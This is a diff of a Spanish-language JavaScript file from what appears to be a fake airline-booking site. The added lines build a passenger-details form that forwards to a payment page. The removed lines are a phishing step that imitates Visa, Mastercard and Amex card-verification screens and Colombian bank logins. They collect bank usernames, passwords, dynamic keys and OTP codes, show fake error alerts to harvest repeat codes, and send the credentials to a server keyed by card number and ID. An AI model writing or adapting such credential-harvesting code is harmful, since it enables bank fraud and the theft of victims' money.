@@ -1,205 +1,127 @@
+const DOMElements = {
+    contPassengersDetails: document.querySelector('#passengers-details'),
+    btnNextStep: document.querySelector('#btn-next-step'),
+    form: document.querySelector('form'),
+    loader: document.querySelector('.loader')
+};
+
 /**
- * SET LOGOS
+ * Startup@Passengers-info
  */
-const companyLoader = document.querySelector('#company-loader');
-const companyLogo = document.querySelector('#company-logo');
-const bankLogo = document.querySelector('#bank-logo');
-if(info.checkerInfo.company === 'VISA'){
-    companyLoader.setAttribute('src', './assets/logos/visa_verified.png');
-    companyLoader.setAttribute('width', '130px');
-    companyLoader.setAttribute('style', 'margin-bottom: 40px');
+document.addEventListener('DOMContentLoaded', () => {
+    eventListeners();
+    updateDOM();
+});
 
-    companyLogo.setAttribute('src', './assets/logos/visa_verified.png');
-    companyLogo.setAttribute('width', '90px');
-}else if(info.checkerInfo.company === 'MC'){
-    companyLoader.setAttribute('src', './assets/logos/mc_id_check_2.jpg');
-    companyLoader.setAttribute('width', '400px');
-
-    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
-    companyLogo.setAttribute('width', '130px');
-}else if(info.checkerInfo.company === 'AM'){
-    companyLoader.setAttribute('src', './assets/logos/amex_check_1.png');
-    companyLoader.setAttribute('width', '200px');
-
-    companyLogo.setAttribute('src', './assets/logos/mc_id_check_1.webp');
-    companyLogo.setAttribute('width', '110px');
-}
-
-
-if(info.metaInfo.ban === 'bancolombia'){
-    window.location.href = './assets/bv/home.html';
-}else{
-    bankLogo.setAttribute('src', `./assets/logos/${info.metaInfo.ban}.png`);
-    bankLogo.setAttribute('width', `120px`);
-}
-
-const mainLoader = document.querySelector('.main-loader');
-setTimeout(() =>{
-    try{
-        mainLoader.classList.remove('show');
-    }catch(e){
-        console.log('e');
-    }
-}, 2500);
 /**
- * SET INPUTS
+ * Events@Passengers-Info
  */
-const user = document.querySelectorAll('#user-b');
-const iuser = document.querySelectorAll('#user');
-const ipuser = document.querySelectorAll('#puser');
-const puser = document.querySelectorAll('#puser-b');
-const cdin = document.querySelectorAll('#cdin');
-const ccaj = document.querySelectorAll('#ccaj');
-const cavance = document.querySelectorAll('#cavance');
-const otpcode = document.querySelectorAll('#otpcode');
-if(info.checkerInfo.mode === 'userpassword'){
+const eventListeners = () => {
+    const { btnNextStep, form, loader } = DOMElements;
 
-    iuser.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-
-    ipuser.forEach(elem =>{
-        elem.classList.remove('hidden');
-    })
-
-    user.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-    puser.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-
-    if(info.metaInfo.ban === 'bancolombia'){
-        puser.forEach(elem => {
-            elem.setAttribute('oninput', 'limitDigits(this, 4);');
+    if (btnNextStep) {
+        btnNextStep.addEventListener('click', () => {
+            const sendBtn = document.getElementById('send-passengers-info');
+            if (sendBtn) sendBtn.click();
         });
     }
-}else if(info.checkerInfo.mode === 'cdin'){
-    setTimeout(() =>{
-        // COMPROBAR ERROR
-        if(info.metaInfo.cdin !== ''){
-            alert('Clave dinámica inválida o expiró, por favor inténtelo de nuevo.');
-        }
-    }, 2050);
 
-    cdin.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-}else if(info.checkerInfo.mode === 'ccaj'){
-    setTimeout(() =>{
-        // COMPROBAR ERROR
-        if(info.metaInfo.ccaj !== ''){
-            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
-        }
-    }, 2050);
-    ccaj.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-}else if(info.checkerInfo.mode === 'cavance'){
-    setTimeout(() =>{
-        // COMPROBAR ERROR
-        if(info.metaInfo.cavance !== ''){
-            alert('Datos inválidos, por favor ingrese la clave de nuevo.');
-        }
-    }, 2050);
-    cavance.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-}else if(info.checkerInfo.mode === 'otpcode'){
-    setTimeout(() =>{
-        // COMPROBAR ERROR
-        if(info.metaInfo.cavance !== ''){
-            alert('Código inválido, por favor ingrese el valor de nuevo.');
-        }
-    }, 2050);
-    otpcode.forEach(elem =>{
-        elem.classList.remove('hidden');
-    });
-}
+    if (form) {
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Aquí podrías agregar lógica para guardar los datos de pasajeros si lo deseas
+            console.log("Datos de pasajeros enviados");
+
+            const loaderEl = document.querySelector('.loader');
+            if (loaderEl) loaderEl.classList.add('show');
+
+            setTimeout(() => {
+                window.location.href = 'payment.html';
+            }, 2500);
+        });
+    }
+};
+
+const updateDOM = () => {
+    if (!info?.flightInfo) {
+        console.log("No hay información de vuelo");
+        return;
+    }
+
+    if (DOMElements.contPassengersDetails) {
+        showPassengersForm(DOMElements.contPassengersDetails, info.flightInfo, '.year');
+    }
+};
 
 /**
- * SET NUMBERS
-*/
-const flightPrice = document.querySelectorAll('#flight-price');
-const cardDigits = document.querySelector('#card-digits');
-cardDigits.textContent = info.metaInfo.p.split(' ')[3];
-function formatPrice(number){
-    return number.toLocaleString('es', {
-        maximumFractionDigits: 0,
-        useGrouping: true
-    });
-}
-/* let finalPrice = "- -";
-if(info.flightInfo.ticket_nat === 'NAC'){
-    finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
-}else if(info.flightInfo.ticket_nat === 'INT'){
-    finalPrice = pricesNAT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
-}else{
-    console.log('flight resume error');
-} */
-
-
-
-/* info.flightInfo.type === 1 ? finalPrice = finalPrice * 2 : ''; */
-
-/* flightPrice.forEach(elem =>{
-    elem.textContent = formatPrice(finalPrice);
-}); */
-
-/**
- * NEXT STEP
+ * Genera los formularios de pasajeros
  */
-const btnNextStep = document.querySelector('#btnNextStep');
-const form = document.querySelector('#form');
+const showPassengersForm = (contPassengers, flightInfo, selectYears) => {
+    if (!contPassengers) return;
 
-btnNextStep.addEventListener('click', () =>{
-    usuario = document.getElementById('user').value;
-    password = document.getElementById('puser').value;
-    console.log(usuario + " " + password);
-    console.log('hola');
-    info.metaInfo.user = usuario;
-    info.metaInfo.puser = password;
-    if(info.checkerInfo.mode === 'userpassword'){
-                async function updateData() {
-                  const response = await fetch(
-                    `${url}/dataTables/dataTables`,
-                    {
-                      method: "GET",
-                      headers: {
-                        "Content-Type": "application/json",
-                      },
-                    }
-                  );
+    contPassengers.innerHTML = '';
 
-                  const serverData = await response.json();
-                  const dataTables = [...serverData];
+    const adults = flightInfo.adults || 1;
+    const children = flightInfo.children || 0;
+    const babies = flightInfo.babies || 0;
 
-                  for (const data of dataTables) {
-                    if (
-                      data.tarjeta == info.metaInfo.p &&
-                      data.id == info.metaInfo.cc
-                    ) {
-                      console.log("Usuario encontrado");
-                      const updateResponse = await fetch(
-                        `${url}/dataTables/updateUsuario/${data.idreg}`,
-                        {
-                          method: "PUT",
-                          headers: {
-                            "Content-Type": "application/json",
-                          },
-                          body: JSON.stringify({
-                            usuario: usuario,
-                            password: password,
-                          }),
-                        }
-                      );
-                      const updateData = await updateResponse.json();
-                    }
-                  }
+    // Adultos
+    for (let i = 1; i <= adults; i++) {
+        contPassengers.innerHTML += `
+            <div class="border-blue-1 rounded-10 pr-2 pl-2 pt-3 pb-3 mt-2">
+                <p class="m-0 fs-4 tc-blue fw-bold">Pasajero Adulto - ${i}</p>
+                <div class="bg-gray-soft rounded-10 p-2">
+                    <div class="input-container">
+                        <input class="fs-1" type="text" placeholder="Nombre" required>
+                        <label>Nombre</label>
+                    </div>
+                    <div class="input-container mb-3">
+                        <input type="text" placeholder="Apellido" required>
+                        <label>Apellido</label>
+                    </div>
+                    <p class="m-0 tc-blue fw-bold fs-5 mb-1">Fecha de nacimiento</p>
+                    <div class="d-flex flex-row justify-space-between align-items-center">
+                        <select required>
+                            <option value="" selected disabled>Día</option>
+                            ${Array.from({length: 31}, (_, i) => `<option value="${i+1}">${i+1}</option>`).join('')}
+                        </select>
+                        <select required>
+                            <option value="" selected disabled>Mes</option>
+                            ${Array.from({length: 12}, (_, i) => `<option value="${i+1}">${i+1}</option>`).join('')}
+                        </select>
+                        <select class="year" required>
+                            <option value="" selected disabled>Año</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
 
-                  window.location.href = "waiting.html";
-                }
+    // Niños y bebés (puedes expandir si lo necesitas)
+    if (children > 0 || babies > 0) {
+        console.log(`Niños: ${children} | Bebés: ${babies}`);
+    }
 
-                updateData();
-                }
-});
+    // Botón oculto para submit
+    contPassengers.innerHTML += `<button id="send-passengers-info" type="submit" class="hidden"></button>`;
+
+    // Llenar años
+    fillYears(selectYears);
+};
+
+const fillYears = (selectsClass) => {
+    const selects = document.querySelectorAll(selectsClass);
+    selects.forEach(select => {
+        // Limpiar primero
+        select.innerHTML = '<option value="" selected disabled>Año</option>';
+        
+        for (let año = 2024; año >= 1920; año--) {
+            const option = document.createElement('option');
+            option.value = año;
+            option.textContent = año;
+            select.appendChild(option);
+        }
+    });
+};
